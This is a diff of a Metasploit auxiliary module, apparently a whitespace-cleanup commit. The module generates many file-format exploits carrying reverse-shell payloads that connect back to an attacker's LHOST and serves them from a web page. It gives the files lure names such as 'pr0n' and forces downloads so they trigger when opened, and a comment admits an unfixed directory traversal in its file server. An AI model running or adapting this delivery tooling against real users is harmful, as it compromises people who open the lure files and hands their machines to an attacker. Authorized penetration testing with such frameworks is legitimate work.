@@ -1,5 +1,9 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -13,15 +17,15 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::HttpServer::HTML
-	
+
 	def initialize(info = {})
-		super(update_info(info, 
+		super(update_info(info,
 			'Name'        => 'File Format Exploit Generator',
 			'Version'     => '$Revision: 8210 $',
 			'Description' => %q{
 				This module generates a combination of File format exploits and make them available to a client. 94.7% Based on browser autopwn by egypt.
 				},
-			'Author'      => 
+			'Author'      =>
 				[
 					'et',
 				],
@@ -29,68 +33,68 @@ class Metasploit3 < Msf::Auxiliary
 			'Actions'     =>
 				[
 					[ 'WebServer', {
-						'Description' => 'Deliver file format exploits in a web page with links to the actual files' 
+						'Description' => 'Deliver file format exploits in a web page with links to the actual files'
 					} ],
 					[ 'OnlyFiles', {
-						'Description' => 'Create file format exploits in selected directory' 
+						'Description' => 'Create file format exploits in selected directory'
 					} ],
-					[ 'list', { 
+					[ 'list', {
 						'Description' => 'List the exploit modules that would be started'
 					} ]
 				],
-			'PassiveActions' => 
+			'PassiveActions' =>
 				[ 'WebServer', 'Email' ],
 			'DefaultAction'  => 'WebServer'))
 
 		register_options([
-			OptAddress.new('LHOST', [ true, 
+			OptAddress.new('LHOST', [ true,
 				'The IP address to use for reverse-connect payloads'
 			]),
-			OptString.new('OUTPUTPATH', [ true, 
+			OptString.new('OUTPUTPATH', [ true,
 				'The location of the files.', File.join(Msf::Config.get_config_root, 'exploits')
 			]),
-			OptBool.new('CREATEFILES', [ true, 
+			OptBool.new('CREATEFILES', [ true,
 				'Set to false in case files are already in the defined path',
 				true
-			]),	
-			OptBool.new('USECONTENTTYPE', [ true, 
+			]),
+			OptBool.new('USECONTENTTYPE', [ true,
 				'Use Content-type header according to file extension. Many exploits may fail depending on this value',
 				true
-			]),	
-			
+			]),
+
 		], self.class)
 
 		register_advanced_options([
-			OptString.new('MATCH', [false, 
+			OptString.new('MATCH', [false,
 				'Only attempt to use exploits whose name matches this regex'
 			]),
-			OptString.new('EXCLUDE', [false, 
+			OptString.new('EXCLUDE', [false,
 				'Only attempt to use exploits whose name DOES NOT match this regex'
 			]),
-			OptBool.new('USEMODNAME', [false, 
+			OptBool.new('USEMODNAME', [false,
 				'Use module names as file names',
 				true
 			]),
-			OptBool.new('USEIFRAMES', [false, 
+			OptBool.new('USEIFRAMES', [false,
 				'Deliver each file as an iframe in webserver',
 				false
 			]),
-			OptString.new('TITLE', [ true, 
+			OptString.new('TITLE', [ true,
 				'The HTML page title.', 'WALL oF SHAME'
 			]),
-			OptString.new('COMMENT', [ true, 
+			OptString.new('COMMENT', [ true,
 				'HTML page text.', '<b>Welcome!</b><br>'
 			]),
-			OptPort.new('LPORT_WIN32', [false, 
+			OptPort.new('LPORT_WIN32', [false,
 				'The port to use for Windows reverse-connect payloads, default is 3333'
 			]),
-			OptPort.new('LPORT_MULTI', [false, 
+			OptPort.new('LPORT_MULTI', [false,
 				'The port to use for Multi reverse-connect payloads, default is 4444'
 			]),
-			OptPort.new('LPORT_MAC', [false, 
+			OptPort.new('LPORT_MAC', [false,
 				'The port to use for Mac reverse-connect payloads, default is 5555'
 			]),
-			OptPort.new('LPORT_GENERIC', [false, 
+			OptPort.new('LPORT_GENERIC', [false,
 				'The port to use for generic reverse-connect payloads, default is 6666'
 			]),
 		], self.class)
@@ -104,14 +108,14 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 		storexp = File.join(Msf::Config.get_config_root, 'exploits')
 		Dir.mkdir(storexp) unless File.directory?(storexp)
-	
+
 		if (action.name == 'list')
 			m_regex = datastore["MATCH"]   ? %r{#{datastore["MATCH"]}}   : %r{}
 			e_regex = datastore["EXCLUDE"] ? %r{#{datastore["EXCLUDE"]}} : %r{^$}
 			[ [framework.exploits, 'exploit' ] ].each do |mtype|
 				mtype[0].each_module do |name, mod|
 					m = mod.new
-				
+
 					if ((m.kind_of? Msf::Exploit::FILEFORMAT) and name =~ m_regex and name !~ e_regex)
 						@exploits[name] = nil
 						print_line name
@@ -124,11 +128,11 @@ class Metasploit3 < Msf::Auxiliary
 						#	tout = Serializer::ReadableText.dump_exploit_target(m, '   ')
 						#	print_line tout
 						#rescue
-						#	print_error "Error retrieving targets in #{name}"	
-						#end							
-					end					
+						#	print_error "Error retrieving targets in #{name}"
+						#end
+					end
 				end
-			end	
+			end
 			print_line
 			print_status("Found #{@exploits.length} exploit modules")
 		elsif (action.name == 'WebServer')
@@ -136,11 +140,11 @@ class Metasploit3 < Msf::Auxiliary
 				warn_no_database
 			end
 			start_exploit_modules()
-			
+
 			if !datastore['CREATEFILES']
 				print_status("FILES NOT CREATED")
 			end
-			
+
 			if @exploits.length < 1 and datastore["CREATEFILES"]
 				print_error("No exploits, check your MATCH and EXCLUDE settings")
 				return false
@@ -151,12 +155,12 @@ class Metasploit3 < Msf::Auxiliary
 				warn_no_database
 			end
 			start_exploit_modules()
-			
-			if @exploits.length < 1 
+
+			if @exploits.length < 1
 				print_error("No exploits, check your MATCH and EXCLUDE settings")
 				return false
-			end	
-		end	
+			end
+		end
 	end
 
 
@@ -209,22 +213,22 @@ class Metasploit3 < Msf::Auxiliary
 		else
 			lport = @gen_lport
 			payload='generic/shell_reverse_tcp'
-		end	
+		end
 		@payloads[lport] = payload
 
 		if datastore['CREATEFILES']
 			print_status("File Format exploit #{name} with payload #{payload}")
 		end
-		
+
 		@exploits[name].datastore['SRVHOST'] = datastore['SRVHOST']
 		@exploits[name].datastore['SRVPORT'] = datastore['SRVPORT']
 
 		# For testing, set the exploit uri to the name of the exploit so it's
 		# easy to tell what is happening from the browser.
 		@exploits[name].datastore['OUTPUTPATH'] = datastore['OUTPUTPATH']
-		
+
 		if (datastore['USEMODNAME'])
-			@exploits[name].datastore['FILENAME'] = name.gsub(/[\\\/]/, '_') + '_' + @exploits[name].datastore['FILENAME']  
+			@exploits[name].datastore['FILENAME'] = name.gsub(/[\\\/]/, '_') + '_' + @exploits[name].datastore['FILENAME']
 		else
 			# Later change for some simple names
 			@exploits[name].datastore['FILENAME'] = filerename(File.extname(@exploits[name].datastore['FILENAME']))
@@ -234,7 +238,7 @@ class Metasploit3 < Msf::Auxiliary
 		@exploits[name].datastore['LHOST'] = @lhost
 		@exploits[name].datastore['EXITFUNC'] = datastore['EXITFUNC'] || 'thread'
 		@exploits[name].datastore['DisablePayloadHandler'] = true
-		
+
 		if datastore['CREATEFILES']
 			@exploits[name].exploit_simple(
 				'LocalInput'     => self.user_input,
@@ -254,12 +258,12 @@ class Metasploit3 < Msf::Auxiliary
 				@exploits.delete(name)
 				return false
 			end
-		end	
+		end
 		return true
 	end
 
 
-	def start_exploit_modules() 
+	def start_exploit_modules()
 		@lhost = (datastore['LHOST'] || "0.0.0.0")
 
 		print_line
@@ -268,8 +272,8 @@ class Metasploit3 < Msf::Auxiliary
 		print_line
 		m_regex = datastore["MATCH"]   ? %r{#{datastore["MATCH"]}}   : %r{}
 		e_regex = datastore["EXCLUDE"] ? %r{#{datastore["EXCLUDE"]}} : %r{^$}
-		
-	
+
+
 		[ [framework.exploits, 'exploit' ] ].each do |mtype|
 			framework.exploits.each_module do |name, mod|
 				m = mod.new
@@ -278,12 +282,12 @@ class Metasploit3 < Msf::Auxiliary
 				end
 			end
 		end
-		
+
 		if action.name == 'OnlyFiles'
 			print_status "--- Done. Files created in #{datastore['OUTPUTPATH']}"
 			return
 		end
-						
+
 		# start handlers for each type of payload
 		[@win_lport, @lin_lport, @osx_lport, @gen_lport].each do |lport|
 			if (lport and @payloads[lport])
@@ -309,16 +313,16 @@ class Metasploit3 < Msf::Auxiliary
 
 	end
 
-	def on_request_uri(cli, request) 
+	def on_request_uri(cli, request)
 		#
-		# I have NOT fixed dir. transversals! 
+		# I have NOT fixed dir. transversals!
 		#
-	
+
 		print_status("Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")
 
 		case request.uri
 		when self.get_resource
-			# This is the first request. 
+			# This is the first request.
 			response = create_response()
 			response["Expires"] = "0"
 
@@ -329,7 +333,7 @@ class Metasploit3 < Msf::Auxiliary
 			Dir.foreach(datastore['OUTPUTPATH']) do |entry|
 				if entry == '.' or entry == '..'
 					# do nothing
-				else	
+				else
 					if !datastore['USEIFRAMES']
 						response.body << "<a href= #{self.get_resource+'/'+entry}>#{entry}</a><br>"
 					else
@@ -341,13 +345,13 @@ class Metasploit3 < Msf::Auxiliary
 
 			cli.send_response(response)
 		when %r{^#{self.get_resource}.*}
-		
+
 			fname = request.uri.gsub("#{self.get_resource}/","")
-		
+
 			response = create_response()
 			response["Expires"] = "0"
-			
-			
+
+
 			if datastore['USECONTENTTYPE']
 				response["Content-type"] = ctype(File.extname(fname))['ctype']
 				if ctype(File.extname(fname))['cdisp']
@@ -357,9 +361,9 @@ class Metasploit3 < Msf::Auxiliary
 				response["Content-type"] = "application/octet-stream"
 				response["Content-disposition"] = "attachment; filename=#{fname}"
 			end
-			
+
 			fullname = File.join(datastore['OUTPUTPATH'],fname)
-			
+
 			if File.exist?(fullname) and File.file?(fullname)
 				src = File.open(fullname, "rb")
 				while (not src.eof?)
@@ -378,13 +382,13 @@ class Metasploit3 < Msf::Auxiliary
 			return false
 		end
 	end
-	
+
 	def filerename(ext)
 		#
-		# A sample way to change file name by type instead of using the ugly 
+		# A sample way to change file name by type instead of using the ugly
 		# exploit name
 		#
-		
+
 		case ext
 		when ".html" then
 			n = "pr0n" + Rex::Text.rand_text_numeric(4)
@@ -398,28 +402,28 @@ class Metasploit3 < Msf::Auxiliary
 			n = "test" + Rex::Text.rand_text_numeric(2)
 		when ".m3u" then
 			n = "musical" + Rex::Text.rand_text_numeric(2)
-		else	
+		else
 			n = "data" + Rex::Text.rand_text_numeric(4)
 		end
-		
+
 		n << ext
-		
+
 		return n
-	
+
 	end
 
 	def ctype(ext)
 		aret = {}
-		
-		
+
+
 		#
-		# Need to force download as some exploits (i.e. pdf) 
-		# dont work thru the browser only work when the file is saved and/or opened 
+		# Need to force download as some exploits (i.e. pdf)
+		# dont work thru the browser only work when the file is saved and/or opened
 		#
-		
+
 		# ctype:  Content-type
 		# cdisp:  true/false Include a "Content-disposition" header to force save as
-		
+
 		case ext
 		when ".html" then
 			aret['ctype'] = "text/html"
@@ -442,12 +446,12 @@ class Metasploit3 < Msf::Auxiliary
 		when ".m3u" then
 			aret['ctype'] = "audio/x-mpegurl"
 			aret['cdisp'] = false
-		else	
+		else
 			aret['ctype'] = "application/octet-stream"
 			aret['cdisp'] = false
 		end
 		return aret
-	end	
+	end
 
 	def warn_no_database
 		print_error("WARNING: Database is disabled")
